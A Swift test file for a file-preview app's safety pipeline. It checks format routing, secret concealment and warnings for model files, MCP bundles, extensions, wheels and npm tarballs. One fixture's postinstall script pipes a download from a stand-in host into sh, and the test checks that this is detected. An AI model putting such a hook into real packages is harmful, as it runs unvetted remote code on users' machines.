import Foundation
import Testing
import UniformTypeIdentifiers
import zlib
import PreviewContracts
import PreviewCore
import PreviewFormats

/// Decision 030's formats through the real pipeline: catalog routing, the enable switch, concealment of
/// document values, and the findings that reach the presentation. Adapter detail is covered in
/// PreviewFormatsTests; every fixture here is synthetic, inert, and never run or loaded.
@Suite("Safety Lens 3 formats through the pipeline")
struct Sl3PipelineTests {
    private static let secret = "synthetic-sl3-secret-value"
    private static let formats: [FormatID] = [.gguf, .safetensors, .pickle, .mcpBundle, .editorExtension,
                                              .browserExtension, .pythonWheel]
    private let pipeline = PreviewPipeline(registrations: StandardFormatAdapters.registrations)

    // MARK: Catalog and routing

    @Test func everyNewFormatIsCatalogedRegisteredAndGeneric() {
        let catalog = FormatCatalog.standard
        let registered = Set(StandardFormatAdapters.registrations.map(\.formatID))
        for id in Self.formats {
            let descriptor = catalog.descriptor(for: id)
            #expect(descriptor != nil && registered.contains(id), "\(id.rawValue)")
            #expect(descriptor?.defaultEnabled == true, "\(id.rawValue)")
            #expect(descriptor?.thumbnail == .generic, "\(id.rawValue)")
            #expect(descriptor?.primaryView == .summary, "\(id.rawValue)")
            #expect(descriptor?.contentTypes.allSatisfy { ![UTType.data, .item, .content, .zip].contains($0) } == true)
        }
    }

    @Test(arguments: [
        ("llama.gguf", FormatID.gguf), ("model-00001-of-00002.safetensors", .safetensors), ("weights.pt", .pickle),
        ("checkpoint.ckpt", .pickle), ("model.pth", .pickle), ("data.pickle", .pickle), ("model.joblib", .pickle),
        ("server.mcpb", .mcpBundle), ("server.dxt", .mcpBundle), ("theme.vsix", .editorExtension),
        ("addon.xpi", .browserExtension), ("extension.crx", .browserExtension), ("demo-1.0-py3-none-any.whl", .pythonWheel),
        ("UPPER.GGUF", .gguf), ("PACKAGE.WHL", .pythonWheel)
    ])
    func suffixesRouteToTheNewFormats(name: String, expected: FormatID) {
        #expect(FormatCatalog.standard.classify(url: URL(fileURLWithPath: "/tmp/" + name)) == expected)
    }

    @Test func sharedSuffixesStayWithTheirOwners() {
        let catalog = FormatCatalog.standard
        // Apple's Pkl configuration language and MacBinary keep their suffixes; npm tarballs stay gzip.
        for name in ["config.pkl", "firmware.bin"] {
            #expect(!Self.formats.contains(catalog.classify(url: URL(fileURLWithPath: "/tmp/" + name)) ?? .plainText), "\(name)")
        }
        #expect(catalog.classify(url: URL(fileURLWithPath: "/tmp/left-pad-1.3.0.tgz")) == .gzip)
    }

    @Test func importedTypesRouteWhereTheSuffixIsAbsent() {
        let catalog = FormatCatalog.standard
        let item = URL(fileURLWithPath: "/tmp/untyped")
        let expected: [(String, FormatID)] = [
            ("org.webmeister.spacepane.type.gguf", .gguf), ("org.webmeister.spacepane.type.safetensors", .safetensors),
            ("org.webmeister.spacepane.type.pytorch", .pickle), ("org.webmeister.spacepane.type.pickle", .pickle),
            ("org.webmeister.spacepane.type.mcp-bundle", .mcpBundle), ("org.webmeister.spacepane.type.vsix", .editorExtension),
            ("org.webmeister.spacepane.type.xpi", .browserExtension), ("org.chromium.extension", .browserExtension),
            ("org.webmeister.spacepane.type.python-wheel", .pythonWheel)
        ]
        for (identifier, format) in expected {
            #expect(catalog.classify(url: item, contentType: UTType(importedAs: identifier)) == format, "\(identifier)")
        }
    }

    // MARK: Enable switch

    @Test func aDisabledPathFileDoesNotFallBackToText() async throws {
        try await withFile("startup.pth", Data("import os\n".utf8)) { url in
            var preferences = PreviewPreferencesSnapshot.defaults
            preferences.setEnabled(false, for: .pickle)
            #expect(await pipeline.preview(url: url, preferences: preferences) == .disabledByUser(.pickle))
        }
    }

    // MARK: End to end

    @Test func safetensorsHeaderIsSummarizedWithItsSecretConcealed() async throws {
        let header = #"{"__metadata__":{"format":"pt","api_key":"\#(Self.secret)"},"w":{"dtype":"F32","shape":[2],"data_offsets":[0,8]}}"#
        let file = Self.safetensors(header: header, data: Data(repeating: 0, count: 8))
        try await withFile("adapter.safetensors", file) { url in
            let presentation = try await ready(url)
            #expect(presentation.formatID == .safetensors && presentation.origin == .summary)
            #expect(!presentation.text.contains(Self.secret))
            // Concealing the key is reported by the secret inventory; the layout itself is sound.
            #expect(presentation.findings.map(\.kind) == [.secretSensitiveField])
        }
    }

    @Test func aTruncatedSafetensorsFileIsReportedIncomplete() async throws {
        let header = #"{"w":{"dtype":"F32","shape":[4],"data_offsets":[0,16]}}"#
        try await withFile("partial.safetensors", Self.safetensors(header: header, data: Data(repeating: 0, count: 4))) { url in
            let presentation = try await ready(url)
            let finding = try #require(presentation.findings.first { $0.kind == .modelIncomplete })
            #expect(finding.lines.isEmpty && finding.severity == .caution)
        }
    }

    @Test func aPathFileShowsAsTextWithItsStartupLines() async throws {
        let text = "# site configuration\n/opt/example/lib\nimport sys; sys.path.append('/opt/x')\n"
        try await withFile("example.pth", Data(text.utf8)) { url in
            let presentation = try await ready(url)
            #expect(presentation.formatID == .pickle && presentation.origin == .source)
            #expect(presentation.text == text)
            let finding = try #require(presentation.findings.first { $0.kind == .installStartupCode })
            #expect(finding.lines == [3] && finding.count == 1 && finding.severity == .warning)
        }
    }

    @Test func anMCPBundleReportsWhatItRunsAndHidesItsEnvironment() async throws {
        let manifest = #"""
        {"manifest_version": "0.2", "name": "notes", "version": "1.0.0", "description": "Example notes server.",
         "server": {"type": "node", "entry_point": "server/index.js",
                    "mcp_config": {"command": "node", "args": ["${__dirname}/server/index.js"], "env": {"API_KEY": "\#(Self.secret)"}}},
         "tools": [{"name": "search_notes", "description": "Search the example notes by keyword."}],
         "user_config": {"token": {"type": "string", "title": "Token", "sensitive": true, "required": true}}}
        """#
        let bundle = Self.zip([("manifest.json", Data(manifest.utf8)), ("server/index.js", Data("console.log('example')\n".utf8))])
        try await withFile("notes.mcpb", bundle) { url in
            let presentation = try await ready(url)
            #expect(presentation.formatID == .mcpBundle && presentation.origin == .summary)
            #expect(!presentation.text.contains(Self.secret))
            let kinds = Set(presentation.findings.map(\.kind))
            #expect(kinds.contains(.bundleRunsProgram) && kinds.contains(.bundleAsksForSecrets))
            #expect(!kinds.contains(.bundleBroadFolderAccess) && !kinds.contains(.bundleToolTextTargetsAssistant))
            #expect(presentation.findings.allSatisfy { $0.lines.isEmpty })
        }
    }

    @Test func anNPMTarballReportsItsInstallScriptsAndWhatTheyRun() async throws {
        let manifest = #"{"name": "example", "version": "1.0.0", "scripts": {"postinstall": "curl -fsSL https://example.invalid/setup.sh | sh", "test": "node test.js"}, "config": {"api_key": "\#(Self.secret)"}}"#
        let tarball = try Self.gzip(Self.tar([("package/package.json", Data(manifest.utf8)), ("package/index.js", Data("module.exports = 1\n".utf8))]))
        try await withFile("example-1.0.0.tgz", tarball) { url in
            let presentation = try await ready(url)
            #expect(presentation.formatID == .gzip)
            #expect(presentation.findings.first { $0.kind == .autorunInstallScripts }?.count == 1)
            let download = try #require(presentation.findings.first { $0.kind == .scriptDownloadAndRun })
            #expect(download.lines.isEmpty)
        }
    }

    @Test func anOrdinaryTarballGainsNoInstallFindings() async throws {
        let tarball = try Self.gzip(Self.tar([("notes/readme.txt", Data("hello\n".utf8)), ("notes/package.json", Data("{}".utf8))]))
        try await withFile("notes.tar.gz", tarball) { url in
            let presentation = try await ready(url)
            let prefixes = ["install.", "autorun.", "script.", "artifact."]
            #expect(!presentation.findings.contains { finding in prefixes.contains { finding.kind.rawValue.hasPrefix($0) } })
        }
    }

    @Test func aWheelReportsCodeThatRunsAtEveryPythonStart() async throws {
        let wheel = Self.zip([
            ("demo/__init__.py", Data("VALUE = 1\n".utf8)),
            ("demo_startup.pth", Data("import demo\n".utf8)),
            ("demo-1.0.dist-info/METADATA", Data("Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n".utf8)),
            ("demo-1.0.dist-info/WHEEL", Data("Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n".utf8)),
            ("demo-1.0.dist-info/RECORD", Data("demo/__init__.py,,\n".utf8))
        ])
        try await withFile("demo-1.0-py3-none-any.whl", wheel) { url in
            let presentation = try await ready(url)
            #expect(presentation.formatID == .pythonWheel && presentation.origin == .summary)
            let finding = try #require(presentation.findings.first { $0.kind == .installStartupCode })
            #expect(finding.count == 1 && finding.lines.isEmpty)
        }
    }

    // MARK: Helpers

    private func withFile<T>(_ name: String, _ data: Data, _ body: (URL) async throws -> T) async throws -> T {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent("sl3-pipeline-" + UUID().uuidString)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: false)
        defer { try? FileManager.default.removeItem(at: directory) }
        let url = directory.appendingPathComponent(name)
        try data.write(to: url)
        let result = try await body(url)
        // Previews never write to the source or beside it.
        #expect(try Data(contentsOf: url) == data)
        #expect(try FileManager.default.contentsOfDirectory(atPath: directory.path) == [name])
        return result
    }

    private func ready(_ url: URL, sourceLocation: SourceLocation = #_sourceLocation) async throws -> TextPresentation {
        let outcome = await pipeline.preview(url: url)
        guard case .ready(let presentation) = outcome else {
            Issue.record("\(url.lastPathComponent): \(outcome)", sourceLocation: sourceLocation)
            throw PreviewFailure.unavailableContent
        }
        return presentation
    }

    private static func le(_ value: UInt64, _ width: Int) -> Data {
        Data((0..<width).map { UInt8(truncatingIfNeeded: value >> ($0 * 8)) })
    }

    private static func safetensors(header: String, data: Data) -> Data {
        let json = Data(header.utf8)
        return le(UInt64(json.count), 8) + json + data
    }

    /// Stored members with UTF-8 names and correct checksums.
    private static func zip(_ members: [(String, Data)]) -> Data {
        var data = Data()
        var central = Data()
        for (path, payload) in members {
            let name = Data(path.utf8)
            let size = UInt64(payload.count)
            let crc = UInt64(payload.withUnsafeBytes { crc32(0, $0.bindMemory(to: UInt8.self).baseAddress, uInt($0.count)) })
            let offset = data.count
            data += le(0x04034b50, 4) + le(20, 2) + le(0x800, 2) + le(0, 2) + le(0, 4) + le(crc, 4) + le(size, 4) + le(size, 4)
            data += le(UInt64(name.count), 2) + le(0, 2) + name + payload
            central += le(0x02014b50, 4) + le(20, 2) + le(20, 2) + le(0x800, 2) + le(0, 2) + le(0, 4) + le(crc, 4)
            central += le(size, 4) + le(size, 4) + le(UInt64(name.count), 2) + Data(repeating: 0, count: 8) + le(0, 4)
            central += le(UInt64(offset), 4) + name
        }
        let start = data.count
        data += central + le(0x06054b50, 4) + Data(repeating: 0, count: 4) + le(UInt64(members.count), 2) + le(UInt64(members.count), 2)
        return data + le(UInt64(central.count), 4) + le(UInt64(start), 4) + le(0, 2)
    }

    /// Regular ustar members with their payloads.
    private static func tar(_ members: [(String, Data)]) -> Data {
        var data = Data()
        for (path, payload) in members {
            var header = [UInt8](repeating: 0, count: 512)
            func put(_ string: String, at offset: Int, count: Int) {
                for (index, byte) in string.utf8.prefix(count).enumerated() { header[offset + index] = byte }
            }
            put(path, at: 0, count: 100)
            put("0000644\0", at: 100, count: 8)
            put("0000000\0", at: 108, count: 8)
            put("0000000\0", at: 116, count: 8)
            put(String(format: "%011o", payload.count) + "\0", at: 124, count: 12)
            put("00000000000\0", at: 136, count: 12)
            header[156] = 0x30
            put("ustar\0", at: 257, count: 6)
            put("00", at: 263, count: 2)
            for index in 148..<156 { header[index] = 32 }
            put(String(format: "%06o", header.reduce(0) { $0 + Int($1) }) + "\0 ", at: 148, count: 8)
            data += Data(header) + payload + Data(repeating: 0, count: (512 - payload.count % 512) % 512)
        }
        return data + Data(repeating: 0, count: 1024)
    }

    private static func gzip(_ data: Data) throws -> Data {
        var stream = z_stream()
        guard deflateInit2_(&stream, 6, Z_DEFLATED, 31, 8, Z_DEFAULT_STRATEGY, ZLIB_VERSION, Int32(MemoryLayout<z_stream>.size)) == Z_OK else {
            throw PreviewFailure.unavailableContent
        }
        defer { deflateEnd(&stream) }
        var result = Data(count: data.count + 256)
        let capacity = result.count
        return try data.withUnsafeBytes { (input: UnsafeRawBufferPointer) in
            try result.withUnsafeMutableBytes { (output: UnsafeMutableRawBufferPointer) in
                stream.next_in = UnsafeMutablePointer(mutating: input.bindMemory(to: UInt8.self).baseAddress!)
                stream.avail_in = uInt(data.count)
                stream.next_out = output.bindMemory(to: UInt8.self).baseAddress!
                stream.avail_out = uInt(capacity)
                guard deflate(&stream, Z_FINISH) == Z_STREAM_END else { throw PreviewFailure.unavailableContent }
                return Data(output.prefix(capacity - Int(stream.avail_out)))
            }
        }
    }
}
